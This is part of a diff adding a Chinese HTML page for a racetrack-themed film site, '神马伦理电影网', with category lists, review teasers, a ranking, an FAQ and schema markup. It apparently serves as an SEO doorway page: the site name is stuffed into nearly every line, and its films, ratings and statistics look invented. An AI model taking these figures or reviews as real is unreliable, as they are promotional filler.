+            <b>草 地 赛 道</b><em>TURF · 类型</em>
+          </div>
+          <ul>
+            <li><a href="#">动作片<i>1240</i></a></li>
+            <li><a href="#">科幻片<i>920</i></a></li>
+            <li><a href="#">悬疑片<i>1080</i></a></li>
+            <li><a href="#">爱情片<i>1530</i></a></li>
+            <li><a href="#">喜剧片<i>1340</i></a></li>
+            <li><a href="#">动画片<i>780</i></a></li>
+          </ul>
+          <p class="tf">草地为主赛道，收录神马伦理电影网全部主流类型片。</p>
+        </div>
+
+        <div class="track">
+          <div class="surface" style="background:linear-gradient(90deg,#8B5A2B,#B07C3E)">
+            <b>泥 地 赛 道</b><em>DIRT · 地区</em>
+          </div>
+          <ul>
+            <li><a href="#">华语电影<i>3260</i></a></li>
+            <li><a href="#">欧美电影<i>4380</i></a></li>
+            <li><a href="#">日韩电影<i>2280</i></a></li>
+            <li><a href="#">其他地区<i>1880</i></a></li>
+          </ul>
+          <p class="tf">泥地为地区赛道，与草地类型可叠加检索。</p>
+        </div>
+
+        <div class="track">
+          <div class="surface" style="background:linear-gradient(90deg,#5A6E8E,#8E9FB8)">
+            <b>全 天 候 道</b><em>ALL WEATHER · 年份</em>
+          </div>
+          <ul>
+            <li><a href="#">2026 新片<i>436</i></a></li>
+            <li><a href="#">2025 佳片<i>512</i></a></li>
+            <li><a href="#">经典修复<i>560</i></a></li>
+            <li><a href="#">冷门佳作<i>740</i></a></li>
+            <li><a href="#">高分专区<i>980</i></a></li>
+            <li><a href="#">深夜专场<i>322</i></a></li>
+          </ul>
+          <p class="tf">全天候道为年份与专题赛道，每周维护一次。</p>
+        </div>
+      </div>
+
+      <p class="tracks-note">说明：神马伦理电影网每周核验一次各赛道收录数量，同一部影片可同时出现在草地、泥地与全天候三条赛道上。</p>
+    </div>
+  </section>
+
+  <!-- 栏目三：赛后复盘 -->
+  <section id="reviews">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="flag">REPLAY</span>
+          <h2>赛后复盘 · 影评与资讯</h2>
+        </div>
+        <a class="more" href="#">阅读全部复盘</a>
+        <p>神马伦理电影网原创内容，观点独立，关键剧情单独标注</p>
+      </div>
+
+      <div class="reviews">
+        <article class="review">
+          <div class="hd"><span class="kind">复盘 · 影评</span><span class="lap">第 01 圈</span></div>
+          <h3>《长街尽头》：伏笔是如何在第三幕全部回收的</h3>
+          <p>逐段拆解它的线索铺设——第一段看似闲聊的对话，其实已经给出了关键时间差。全文无剧透，可放心阅读后再决定要不要买票。</p>
+          <blockquote>好的悬疑片不靠吓你，靠让你散场后回头重跑一遍前面的路程。</blockquote>
+          <p class="sig"><span>神马伦理电影网 · 影评组</span><span>2026-09-30</span><span>阅读 1.4 万</span></p>
+        </article>
+
+        <article class="review">
+          <div class="hd"><span class="kind">复盘 · 资讯</span><span class="lap">第 02 圈</span></div>
+          <h3>2026 秋季档前瞻：六部值得标记的院线片</h3>
+          <p>今年秋季档悬疑与科幻占比明显上升，神马伦理电影网提前梳理必看清单，并附三条避雷提示，帮你把电影票花在刀刃上。</p>
+          <blockquote>把电影票花在刀刃上，先从排除不值得的开始。</blockquote>
+          <p class="sig"><span>神马伦理电影网 · 编辑部</span><span>2026-09-27</span><span>阅读 9200</span></p>
+        </article>
+
+        <article class="review">
+          <div class="hd"><span class="kind">复盘 · 数据</span><span class="lap">第 03 圈</span></div>
+          <h3>数据观察：老片回看潮正在改变赛道结构</h3>
+          <p>近三个月，上线十年以上的经典片播放量同比增长 38%，神马伦理电影网数据组解读这波回看潮背后的观影习惯变化。</p>
+          <blockquote>回看不是怀旧，是把选择权从新片手里拿回来。</blockquote>
+          <p class="sig"><span>神马伦理电影网 · 数据组</span><span>2026-09-22</span><span>阅读 6800</span></p>
+        </article>
+
+        <article class="review">
+          <div class="hd"><span class="kind">复盘 · 专栏</span><span class="lap">第 04 圈</span></div>
+          <h3>周末片单：五部适合放松的治愈系电影</h3>
+          <p>不想动脑的周末怎么过？神马伦理电影网挑了五部节奏舒缓、情绪温暖的片子，附一句话推荐理由与建议观看顺序。</p>
+          <blockquote>治愈片的标准很简单：看完能安稳睡一觉。</blockquote>
+          <p class="sig"><span>神马伦理电影网 · 片单组</span><span>2026-09-18</span><span>阅读 7500</span></p>
+        </article>
+
+        <article class="review">
+          <div class="hd"><span class="kind">复盘 · 指南</span><span class="lap">第 05 圈</span></div>
+          <h3>看片配速：不同类型该用什么节奏跑</h3>
+          <p>悬疑片不适合分次看，纪录片反而适合。神马伦理电影网按类型给出一份"配速表"，附建议分段位置。</p>
+          <blockquote>会配速的人，才跑得完全程。</blockquote>
+          <p class="sig"><span>神马伦理电影网 · 观影组</span><span>2026-09-15</span><span>阅读 5200</span></p>
+        </article>
+
+        <article class="review">
+          <div class="hd"><span class="kind">复盘 · 访谈</span><span class="lap">第 06 圈</span></div>
+          <h3>对话纪录片导演：一年能跑出多少真实</h3>
+          <p>专访《一年七城》主创，聊素材取舍、拍摄伦理，以及纪录片作者与被拍者之间那条微妙的边界。访谈经本人审阅后刊发。</p>
+          <blockquote>剪辑台上没有真相，只有你愿意承担的解释。</blockquote>
+          <p class="sig"><span>神马伦理电影网 · 采访组</span><span>2026-09-11</span><span>阅读 4300</span></p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：名次杆 -->
+  <section id="rank">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="flag r">RESULT</span>
+          <h2>神马伦理电影网名次杆</h2>
+        </div>
+        <a class="more" href="#">查看完整榜单</a>
+        <p>综合站内评分、收藏量与讨论热度，每两小时结算一次名次</p>
+      </div>
+
+      <div class="rankwrap">
+        <ol class="pole">
+          <li><span class="pos">01</span><span class="nm"><b>长街尽头</b><small>悬疑 / 犯罪 / 2026</small></span><span class="run" aria-hidden="true"><i style="width:96%"></i></span><span class="pt">9.4</span></li>
+          <li><span class="pos">02</span><span class="nm"><b>归途列车</b><small>剧情 / 家庭 / 2026</small></span><span class="run" aria-hidden="true"><i style="width:92%"></i></span><span class="pt">9.1</span></li>
+          <li><span class="pos">03</span><span class="nm"><b>第七大陆</b><small>科幻 / 冒险 / 2026</small></span><span class="run" aria-hidden="true"><i style="width:89%"></i></span><span class="pt">8.9</span></li>
+          <li><span class="pos">04</span><span class="nm"><b>橘子汽水</b><small>青春 / 文艺 / 2025</small></span><span class="run" aria-hidden="true"><i style="width:86%"></i></span><span class="pt">8.7</span></li>
+          <li><span class="pos">05</span><span class="nm"><b>纸上星河</b><small>动画 / 治愈 / 2026</small></span><span class="run" aria-hidden="true"><i style="width:83%"></i></span><span class="pt">8.5</span></li>
+          <li><span class="pos">06</span><span class="nm"><b>一年七城</b><small>纪录 / 人文 / 2024</small></span><span class="run" aria-hidden="true"><i style="width:79%"></i></span><span class="pt">8.3</span></li>
+          <li><span class="pos">07</span><span class="nm"><b>静默海域</b><small>剧情 / 悬疑 / 2025</small></span><span class="run" aria-hidden="true"><i style="width:75%"></i></span><span class="pt">8.1</span></li>
+          <li><span class="pos">08</span><span class="nm"><b>深夜放映厅</b><small>合集 / 常驻片单</small></span><span class="run" aria-hidden="true"><i style="width:70%"></i></span><span class="pt">7.9</span></li>
+        </ol>
+
+        <aside class="sidecard">
+          <h3>ODDS BOARD　—　本期热度赔率</h3>
+          <ol>
+            <li><b>1</b><a href="#">长街尽头</a><span class="od"><s>3.40</s><bdi>2.10</bdi></span></li>
+            <li><b>2</b><a href="#">归途列车</a><span class="od"><s>3.80</s><bdi>2.60</bdi></span></li>
+            <li><b>3</b><a href="#">第七大陆</a><span class="od"><s>4.20</s><bdi>3.10</bdi></span></li>
+            <li><b>4</b><a href="#">橘子汽水</a><span class="od"><s>5.00</s><bdi>4.20</bdi></span></li>
+            <li><b>5</b><a href="#">纸上星河</a><span class="od"><s>6.50</s><bdi>5.30</bdi></span></li>
+          </ol>
+          <p>赔率由神马伦理电影网站内热度换算，划掉的数字为上期赔率，每周一随新一场赛事更新。</p>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：关于 -->
+  <section id="about">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="flag g">ABOUT</span>
+          <h2>关于神马伦理电影网</h2>
+        </div>
+        <a class="more" href="#">联系我们</a>
+        <p>为什么做成一座赛马场，以及我们坚持的四条赛规</p>
+      </div>
+
+      <div class="about">
+        <div class="ab">
+          <h3>神马伦理电影网是什么</h3>
+          <p><span class="hl">神马伦理电影网</span>创办于 2023 年，是一座按赛马场逻辑搭建的中文电影站点。我们把每部值得看的电影看作一匹赛驹：今日出闸是当天的片单，赛道分类是索引，赛后复盘是影评，名次杆是排行榜。</p>
+          <p>名字里的"神马"，说的是那种难得一遇的好片——它跑起来的时候，你只想跟着它一路到底。<b>神马伦理电影网</b>不做资源搬运，只做挑选、排序与解释，所有内容免费阅读。</p>
+        </div>
+        <div class="ab">
+          <h3>编辑部四条赛规</h3>
+          <ol class="rules">
+            <li><em>S1</em><span>没看完的片子不进闸，宁可空着也不凑数。</span></li>
+            <li><em>S2</em><span>复盘不剧透，关键剧情单独标注，由读者选择是否展开。</span></li>
+            <li><em>S3</em><span>名次可追溯，公开打分人数与分数分布，拒绝水军。</span></li>
+            <li><em>S4</em><span>闸位不出售，榜单只由数据与编辑判断决定。</span></li>
+          </ol>
+          <div class="card-mini">
+            <h4>RACE CARD　—　本场数据卡</h4>
+            <dl>
+              <dt>本场出闸</dt><dd>6 驹</dd>
+              <dt>赛道类型</dt><dd>草地 / 泥地</dd>
+              <dt>结算间隔</dt><dd>2 小时</dd>
+              <dt>收录总量</dt><dd>16800</dd>
+              <dt>编辑均分</dt><dd>8.7</dd>
+            </dl>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目六：常见问答 -->
+  <section id="faq">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="flag r">FAQ</span>
+          <h2>常见问答</h2>
+        </div>
+        <p>关于神马伦理电影网的使用与内容说明 · 点选问题展开回答</p>
+      </div>
+
+      <div class="faq">
+        <details open>
+          <summary>名次杆上的评分是怎么算出来的？<span class="code">Q-01</span></summary>
+          <p>神马伦理电影网采用"观众打分 + 编辑评分"加权模型，观众分占七成、编辑分占三成，并剔除异常打分样本。每个影片条目都会展示参与打分的人数与分数分布区间，方便你判断样本是否足够。</p>
+        </details>
+        <details>
+          <summary>闸位和名次有什么区别？<span class="code">Q-02</span></summary>
+          <p>闸位是当日片单的出闸顺序（1–6 号），由编辑组按当日判断排列，每天 08:00 重新排定；名次杆则是综合评分、收藏量与讨论热度后的结算结果，每两小时更新一次。闸位靠前不代表名次靠前。</p>
+        </details>
+        <details>
+          <summary>神马伦理电影网多久开一次闸？<span class="code">Q-03</span></summary>
+          <p>每日 08:00 开闸并更新今日出闸片单与名次杆；榜单每两小时结算一次；赛道分类每周维护一次；赛后复盘与影视资讯不定期发布。</p>
+        </details>
+        <details>
+          <summary>如何向我推荐的电影投稿？<span class="code">Q-04</span></summary>
+          <p>通过页面底部的"投稿与合作"入口留言，注明片名、年份与你的一句话推荐理由，神马伦理电影网编辑组会在三个工作日内回复。</p>
+        </details>
+        <details>
+          <summary>手机上能正常看闸门和名次杆吗？<span class="code">Q-05</span></summary>
+          <p>可以。神马伦理电影网全站响应式：手机端起跑闸门收窄为三列小闸位，赛驹卡转为单列，名次杆隐藏进度条只保留名次与评分，导航收进菜单按钮，单手即可完成选片。</p>
+        </details>
+      </div>
+    </div>
+  </section>
+</main>
+
+<!-- 底部 -->
+<footer>
+  <div class="wrap">
+    <div class="f-grid">
+      <div class="f-col">
+        <h4>神马伦理电影网</h4>
+        <p>神马伦理电影网是一座按赛马场逻辑搭建的中文电影站点，每日开闸更新今日出闸片单、赛道分类索引、赛后复盘影评、名次杆排行榜与观影指南，让每一部好片都像神驹一样跑在你前面。</p>
+        <span class="f-url">https://shenmalunlidianyingwang-cn.github.io</span>
+      </div>
+      <div class="f-col">
+        <h4>马场栏目</h4>
+        <ul>
+          <li><a href="#gates">今日出闸片单</a></li>
+          <li><a href="#tracks">赛道分类索引</a></li>
+          <li><a href="#reviews">赛后复盘影评</a></li>
+          <li><a href="#rank">名次杆排行榜</a></li>
+        </ul>
+      </div>
+      <div class="f-col">
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#about">关于神马伦理电影网</a></li>
+          <li><a href="#faq">常见问答</a></li>
+          <li><a href="#">投稿与合作</a></li>
+          <li><a href="#">内容声明</a></li>
+        </ul>
+      </div>
+      <div class="f-col">
+        <h4>友情链接</h4>
+        <ul>
+          <li><a href="#">电影节日历</a></li>
+          <li><a href="#">独立电影观察</a></li>
+          <li><a href="#">影视资料库</a></li>
+          <li><a href="#">影迷社区</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="kw">
+      相关关键词：
+      <a href="#">神马伦理电影网</a><a href="#">电影推荐</a><a href="#">今日出闸</a><a href="#">最新电影</a><a href="#">影视资讯</a><a href="#">高分电影</a><a href="#">电影排行榜</a><a href="#">影评</a><a href="#">观影指南</a><a href="#">电影分类</a>
+    </div>
+
+    <div class="f-bot">
+      <span>&copy; 2026 神马伦理电影网 SHENMA MOVIE RACETRACK · 第 1286 场 · 保留所有权利</span>
+      <span><a href="#">隐私政策</a> · <a href="#">使用条款</a> · <a href="#home">回到马场大堂</a></span>
+    </div>
+  </div>
+</footer>
+<div class="rail" aria-hidden="true"></div>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://shenmalunlidianyingwang-cn.github.io/#website",
+      "name": "神马伦理电影网",
+      "alternateName": "SHENMA MOVIE RACETRACK",
+      "url": "https://shenmalunlidianyingwang-cn.github.io/",
+      "description": "神马伦理电影网是专注电影推荐与影视资讯的中文影迷站点，按赛马场节奏每日开闸：今日出闸片单、赛道分类索引、赛后复盘影评、名次杆排行榜与观影指南。",
+      "inLanguage": "zh-CN",
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": "https://shenmalunlidianyingwang-cn.github.io/?q={search_term_string}",
+        "query-input": "required name=search_term_string"
+      }
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://shenmalunlidianyingwang-cn.github.io/#organization",
+      "name": "神马伦理电影网",
+      "url": "https://shenmalunlidianyingwang-cn.github.io/",
+      "description": "神马伦理电影网提供今日出闸片单、赛道分类索引、赛后复盘影评、名次杆排行榜与观影指南服务，每日开闸更新。"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {"@type": "ListItem", "position": 1, "name": "神马伦理电影网首页", "item": "https://shenmalunlidianyingwang-cn.github.io/"},
+        {"@type": "ListItem", "position": 2, "name": "今日出闸片单", "item": "https://shenmalunlidianyingwang-cn.github.io/#gates"},
+        {"@type": "ListItem", "position": 3, "name": "赛道分类索引", "item": "https://shenmalunlidianyingwang-cn.github.io/#tracks"},
+        {"@type": "ListItem", "position": 4, "name": "赛后复盘影评与资讯", "item": "https://shenmalunlidianyingwang-cn.github.io/#reviews"},
+        {"@type": "ListItem", "position": 5, "name": "神马伦理电影网名次杆", "item": "https://shenmalunlidianyingwang-cn.github.io/#rank"}
+      ]
+    }
+  ]
+}
+</script>
+
+</body>
+</html>
